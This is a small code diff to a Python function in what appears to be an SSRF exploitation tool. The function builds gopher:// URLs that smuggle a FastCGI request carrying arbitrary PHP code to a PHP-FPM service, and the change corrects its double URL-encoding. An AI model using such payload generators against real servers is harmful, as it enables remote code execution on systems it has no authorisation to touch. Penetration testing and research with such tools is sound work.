@@ -259,5 +259,5 @@ def gopherfastcgi_code(host: str = "127.0.0.1", port: int = 9000, phpcode: str =
     raw_payload = generate_code_payload(host, port, phpcode, php_file_path)
     request_ssrf = urlparse.quote(raw_payload)
     if urlEncoding:
-        request_ssrf = urlparse.quote(raw_payload)
+        request_ssrf = urlparse.quote(request_ssrf)
     return f"gopher://{host}:{port}/_{request_ssrf}"
